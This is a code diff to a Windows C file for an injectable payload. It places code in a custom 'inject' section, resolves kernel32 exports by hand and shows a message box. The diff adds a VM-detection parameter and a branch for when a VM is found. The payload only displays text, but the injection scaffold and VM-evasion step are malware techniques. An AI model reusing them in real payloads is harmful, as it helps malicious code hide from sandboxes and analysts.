@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <winnt.h>
+#include <intrin.h>
 
 // Type definitions
 typedef struct _UNICODE_STRING {
@@ -47,7 +48,6 @@ typedef void (WINAPI *pOutputDebugStringA)(LPCSTR);
 
 #pragma section("inject", read, execute)
 
-
 // Hardcoded strings
 __declspec(allocate("inject")) wchar_t kernel32_name[] = L"KERNEL32.DLL";
 __declspec(allocate("inject")) const char user32_name[] = "user32.dll";
@@ -56,6 +56,7 @@ __declspec(allocate("inject")) const char loadlib_name[] = "LoadLibraryA";
 __declspec(allocate("inject")) const char getproc_name[] = "GetProcAddress";
 __declspec(allocate("inject")) const char msg_title[] = "Injected!";
 __declspec(allocate("inject")) const char msg_text[] = "Hello from payload";
+__declspec(allocate("inject")) const char vm_msg_text[] = "Running in a VM environment!";
 
 /**
  * Compares two strings case-insensitively.
@@ -136,7 +137,6 @@ HMODULE get_kernel32_base() {
     return NULL;
 }
 
-
 /**
  * Resolves an export function from a module by its name.
  * 
@@ -179,7 +179,8 @@ FARPROC resolve_export(HMODULE module, const char* name) {
  * @return A value based on the argument count.
  */
 __declspec(code_seg("inject"))
-int main_payload(int unused) {
+void main_payload(int is_vm) {
+
     HMODULE kernel32 = get_kernel32_base();
 
     pGetProcAddress GetProcAddress_ = (pGetProcAddress)resolve_export(kernel32, getproc_name);
@@ -194,7 +195,10 @@ int main_payload(int unused) {
     pMessageBoxA MessageBoxA_ = (pMessageBoxA)GetProcAddress_(user32, msgboxa_name);
 
     // Show message box
-    MessageBoxA_(NULL, msg_text, msg_title, MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
-
-    return 2600 + unused; // Return a value based on the argument count
+    if (is_vm) {
+        // Take appropriate action for VM detection
+        MessageBoxA_(NULL, vm_msg_text, msg_title, MB_OK | MB_ICONINFORMATION);
+    } else {
+        MessageBoxA_(NULL, msg_text, msg_title, MB_OK | MB_ICONINFORMATION);
+    }
 }
